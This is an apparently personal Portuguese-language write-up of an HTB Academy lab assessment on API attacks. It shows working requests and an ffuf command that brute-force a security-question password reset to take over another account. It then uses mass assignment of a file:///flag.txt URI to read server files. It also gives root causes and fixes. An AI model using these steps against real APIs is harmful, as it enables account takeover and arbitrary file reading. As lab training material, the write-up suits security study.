<div align="center">

# 🎯 HTB Academy — API Attacks: Skills Assessment
### Inlanefreight E-Commerce Marketplace API (v2)

![HTB](https://img.shields.io/badge/HackTheBox-Academy-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white)
![Module](https://img.shields.io/badge/Module-API%20Attacks-blue?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Skills%20Assessment-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)

</div>

---

## 📑 Índice

- [Introdução](#-introdução)
- [Reconhecimento inicial da API v2](#-reconhecimento-inicial-da-api-v2)
- [Analisando as Roles](#-analisando-as-roles)
- [Testando o Password Reset](#-testando-o-password-reset)
- [Identificando uma pergunta de baixa entropia](#-identificando-uma-pergunta-de-baixa-entropia)
- [Comprometendo a conta do supplier](#-comprometendo-a-conta-do-supplier)
- [Analisando o campo ProfessionalCVPDFFileURI](#-analisando-o-campo-professionalcvpdffileuri)
- [Local File Read](#-local-file-read)
- [Cadeia completa da exploração](#-cadeia-completa-da-exploração)
- [Vulnerabilidades envolvidas](#-vulnerabilidades-envolvidas)
- [Root Cause](#-root-cause)
- [Recomendações](#-recomendações)
- [Skills desenvolvidas](#-skills-desenvolvidas)
- [Conclusão](#-conclusão)
- [Disclaimer](#️-disclaimer)

---

## 📌 Introdução

O objetivo do Skills Assessment era avaliar a segurança da versão `v2` da API do **Inlanefreight E-Commerce Marketplace**.

As vulnerabilidades existentes nas versões `v0` e `v1` haviam sido corrigidas, porém novas funcionalidades foram adicionadas por desenvolvedores júnior. O objetivo era identificar se essas novas funcionalidades introduziram novas vulnerabilidades e, posteriormente, obter o conteúdo de `/flag.txt`.

**Credenciais fornecidas:**
```text
Username: htbpentester@hackthebox.com
Password: HTBPentester
```

> <img src="https://i.imgur.com/2xMwwxw.png"/>

---

## 🔍 Reconhecimento inicial da API v2

Duas novas funcionalidades chamaram atenção antes mesmo de iniciar a exploração ativa.

**1. Password reset via Security Question:**
```http
POST /api/v2/authentication/suppliers/passwords/resets/security-question-answers
```
Diferente das versões anteriores (SMS e e-mail), esse mecanismo pode sofrer de baixa entropia nas respostas, respostas adivinháveis e ausência de rate limiting.

**2. Upload/recuperação de currículo:**
```http
POST /api/v2/suppliers/current-user/cv
GET  /api/v2/suppliers/current-user/cv
```

Consultando `GET /api/v2/suppliers/current-user`, o campo `professionalCVPDFFileURI` revelou que o backend armazena uma **URI referente ao arquivo**. Hipótese: se essa URI for controlável, talvez seja possível recuperar arquivos arbitrários do sistema.

Problema: a conta inicial não tinha permissão de upload de CV. Era preciso encontrar outro caminho primeiro.

---

## 🔑 Analisando as Roles

A conta inicial possuía apenas:
```text
Suppliers_GetAll
Suppliers_Get
```

Isso permitia listar todos os suppliers:
```http
GET /api/v2/suppliers
```

A maioria dos registros retornava `"securityQuestion": "SupplierDidNotProvideYet"`, mas alguns suppliers tinham uma pergunta real configurada, por exemplo:
```json
{
  "name": "Patrick Howard",
  "email": "P.Howard1536@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
```

Esses usuários se tornaram alvos potenciais do fluxo de reset de senha.

> <img src="https://i.imgur.com/kzJyzSJ.png"/>

---

## 🧪 Testando o Password Reset

Requisição manual de validação:
```http
POST /api/v2/authentication/suppliers/passwords/resets/security-question-answers
```
```json
{
  "SupplierEmail": "P.Howard1536@globalsolutions.com",
  "SecurityQuestionAnswer": "teste",
  "NewPassword": "HTBHacked123@"
}
```

Resposta:
```json
{ "successStatus": false }
```

Confirmado: o endpoint valida a resposta. Faltava descobrir a resposta correta.

---

## 🎨 Identificando uma pergunta de baixa entropia

A pergunta `"What is your favorite color?"` tem um espaço de respostas muito menor que uma senha tradicional. Duas wordlists foram usadas com `ffuf`:

```bash
ffuf -w colors.txt:QUESTION \
     -w emails.txt:EMAILS \
     -u http://TARGET:PORT/api/v2/authentication/suppliers/passwords/resets/security-question-answers \
     -H 'Content-Type: application/json' \
     -d '{"SupplierEmail": "EMAILS", "SecurityQuestionAnswer": "QUESTION", "NewPassword": "HTBHacked123@"}' \
     -fr '{"successStatus":false}'
```

Resultado: o fuzzing identificou uma combinação válida de e-mail + resposta que retornou sucesso, redefinindo a senha da conta-alvo para `HTBHacked123@`. (Resposta e e-mail específicos omitidos aqui de propósito, para não expor a solução do assessment.)

> <img src="https://i.imgur.com/y1pYwdJ.png"/>

---

## 🔓 Comprometendo a conta do supplier

Login com a nova senha foi bem-sucedido, gerando um JWT com permissões diferentes das da conta inicial, incluindo acesso a `POST /api/v2/suppliers/current-user/cv`, antes negado.

**Cadeia até aqui:**
```
Conta inicial → Suppliers_GetAll → Suppliers com Security Question →
Brute force da resposta → Password Reset → Conta comprometida →
Novas permissões → Upload de CV liberado
```

> <img src="https://i.imgur.com/Shd9QSZ.png"/>

---

## 📄 Analisando o campo ProfessionalCVPDFFileURI

Requisição `PATCH` para testar controle direto do campo:

```http
PATCH /api/v2/suppliers/current-user
```
```json
{
  "SecurityQuestion": "What is your favorite color?",
  "SecurityQuestionAnswer": "<resposta identificada via fuzzing>",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "9999999999",
  "Password": "HTBHacked123@"
}
```

A requisição foi **aceita**. O campo que deveria representar apenas o CV do usuário passou a apontar para um arquivo arbitrário do sistema.

> <img src="https://i.imgur.com/VYM8cEW.png"/>

---

## 📂 Local File Read

```
ProfessionalCVPDFFileURI = file:///flag.txt
        ↓
GET /api/v2/suppliers/current-user/cv
        ↓
Backend acessa o arquivo
        ↓
Conteúdo retornado em Base64
```

Resposta da API:
```json
{
  "successStatus": true,
  "base64Data": "<conteúdo em base64 omitido>"
}
```

Fazendo o decode do `base64Data`, o conteúdo de `/flag.txt` foi obtido (valor omitido aqui intencionalmente para não expor a solução do assessment).

> <img src="https://i.imgur.com/cKQD4YP.png"/>

---

## 🔗 Cadeia completa da exploração

```
                    API v2 RECON
                         │
          ┌──────────────┴──────────────┐
          │                             │
 Security Question                 CV functionality
          │                             │
          ▼                             ▼
  Suppliers_GetAll              professionalCVPDFFileURI
          │                             │
          ▼                             │
Suppliers com Security Question         │
          │                             │
          ▼                             │
   Brute force de respostas             │
          │                             │
          ▼                             │
     Password Reset                     │
          │                             │
          ▼                             │
   Supplier comprometido                │
          │                             │
          ▼                             │
      Upload de CV                      │
          │                             │
          └──────────────┬──────────────┘
                         ▼
                PATCH /current-user
                         │
                         ▼
        ProfessionalCVPDFFileURI =
                 file:///flag.txt
                         │
                         ▼
                GET /current-user/cv
                         │
                         ▼
                  Base64 response
                         │
                         ▼
                     FLAG
```

---

## 🛡️ Vulnerabilidades envolvidas

### 1. Broken Authentication
Password reset via Security Question com pergunta previsível, resposta de baixa entropia e ausência efetiva de proteção contra automação.

### 2. Broken Function Level Authorization / Exposição de informações
`Suppliers_GetAll` expõe `email`, `securityQuestion` e `professionalCVPDFFileURI` de outros usuários sem necessidade, dado suficiente para direcionar o ataque de reset.

### 3. BOPLA / Mass Assignment
`PATCH /api/v2/suppliers/current-user` aceita a modificação de `ProfessionalCVPDFFileURI`, atributo que deveria ser controlado exclusivamente pelo servidor.

### 4. Local File Read
O backend confia na URI fornecida pelo cliente e a resolve diretamente, transformando o Mass Assignment em uma primitiva de leitura arbitrária de arquivos.

---

## 🧬 Root Cause

Confiança excessiva em dados controlados pelo cliente.

**Fluxo inseguro:**
```
Cliente → define ProfessionalCVPDFFileURI → Backend confia no valor → Abre o arquivo → Retorna o conteúdo
```

**Fluxo seguro esperado:**
```
Cliente solicita seu CV → Backend identifica o usuário → Backend resolve o caminho internamente →
Valida que o arquivo pertence ao usuário → Retorna o arquivo
```

O cliente nunca deveria poder decidir arbitrariamente qual arquivo o servidor lê.

---

## ✅ Recomendações

**Password Reset**
- Respostas de alta entropia; nunca perguntas previsíveis
- Rate limiting e limite de tentativas por conta
- Proteção contra automação (CAPTCHA, delays progressivos)
- MFA como camada adicional

**Supplier Enumeration**
- Expor apenas os dados necessários ao usuário autenticado
- `securityQuestion` nunca deveria estar visível para terceiros

**Mass Assignment**
- Usar DTOs explícitos por endpoint, nunca bind direto do objeto completo
- `ProfessionalCVPDFFileURI` deve ser gerado e controlado só pelo backend

**File Access**
- Bloquear esquemas `file://` e caminhos absolutos
- Validar que o arquivo pertence ao usuário autenticado
- Normalizar e restringir a um diretório permitido (allowlist)

---

## 🧠 Skills desenvolvidas

- API Recon & Enumeration (OWASP API Security Top 10)
- Exploração de Broken Authentication em fluxos de password reset customizados
- Fuzzing multi-payload com `ffuf` (wordlists combinadas)
- Identificação e exploração de Mass Assignment / BOPLA
- Encadeamento de vulnerabilidades de baixa severidade isolada em um Local File Read de alto impacto
- Análise de Root Cause e proposição de correções

---

## 🏁 Conclusão

Esse assessment reforçou como falhas isoladas e aparentemente pequenas podem ser encadeadas em um impacto muito maior.

Uma funcionalidade nova de recuperação de senha, combinada a uma pergunta de segurança previsível, permitiu comprometer uma conta via fuzzing. Essa conta, por sua vez, desbloqueou uma permissão que a conta inicial não tinha. A partir daí, um endpoint de atualização de perfil aceitou a modificação de um campo que deveria ser controlado exclusivamente pelo servidor e esse campo foi reaproveitado por um endpoint legítimo para ler um arquivo fora do escopo pretendido.

Nenhuma dessas etapas, isoladamente, teria alto impacto. Juntas, resultaram em leitura arbitrária de arquivos no servidor.

---

## ⚠️ Disclaimer

Este write-up documenta uma atividade realizada em ambiente controlado e autorizado do HTB Academy, com fins exclusivamente educacionais. As técnicas aqui descritas não devem ser aplicadas contra sistemas sem autorização explícita.

---

<div align="center">

**Autor:** Paulo Douglas
*Documentando a jornada de transição para Cybersecurity — Web Application Penetration Testing & Offensive Security*

</div>
